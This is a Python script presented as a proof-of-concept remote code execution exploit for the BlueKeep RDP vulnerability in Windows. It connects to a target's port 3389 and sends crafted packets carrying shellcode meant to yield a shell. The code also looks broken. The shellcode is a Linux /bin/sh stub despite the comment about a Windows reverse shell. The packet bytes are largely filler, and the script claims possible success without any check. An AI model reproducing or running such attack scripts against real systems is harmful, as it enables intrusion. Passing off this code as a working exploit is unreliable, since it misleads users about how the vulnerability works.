# Remote Code Execution (RCE) Exploit: BlueKeep (CVE-2019-0708) PoC
# Author: ade mulyana
# Description: Proof-of-Concept (PoC) exploit for BlueKeep vulnerability, allowing remote code execution on vulnerable Windows systems via RDP.

import socket
import struct
import sys
import time

# Target IP and port
TARGET_IP = "[TARGET_IP]"
TARGET_PORT = 3389  # Default RDP port

# Shellcode for reverse shell (replace with your own shellcode)
# Example shellcode for a reverse shell on port 4444
SHELLCODE = (
    b"\x48\x31\xc0\x48\x83\xc0\x29\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f"
    b"\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
)

# Function to create RDP packet
def create_packet(payload):
    # RDP Header
    rdp_header = (
        b"\x03\x00\x00\x13"  # TPKT Header
        b"\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    )
    # X.224 Connection Request PDU
    x224_pdu = (
        b"\x03\x00\x00\x27"  # X.224 Header
        b"\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x03\x00\x00\x01\x00\x00\x00"  # CR TPDU
    )
    # RDP Negotiation Request
    rdp_negotiation = (
        b"\x03\x00\x01\x5B\x02\x01\xE0\x80\x7F\x65\x14\x02\x0C\x01\xB1\x00"
        b"\x01\x00\x08\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
        b"\x00\x08\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    )
    # Concatenate all parts to form complete packet
    packet = rdp_header + x224_pdu + rdp_negotiation + payload
    return packet

# Function to exploit BlueKeep vulnerability
def exploit_bluekeep(target_ip, target_port):
    try:
        print("[*] Connecting to target...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        print("[+] Connected successfully!")

        print("[*] Sending exploit payload...")
        # Create packet with shellcode
        packet = create_packet(SHELLCODE)
        s.send(packet)
        print("[+] Payload sent successfully!")

        print("[*] Waiting for shell...")
        time.sleep(5)  # Adjust delay as needed
        print("[!] Exploit may have been successful, check for shell!")

    except Exception as e:
        print("[-] An error occurred:", e)
        sys.exit(1)

    finally:
        s.close()

# Main function
def main():
    print("[*] Exploiting BlueKeep vulnerability...")
    exploit_bluekeep(TARGET_IP, TARGET_PORT)

if __name__ == "__main__":
    main()
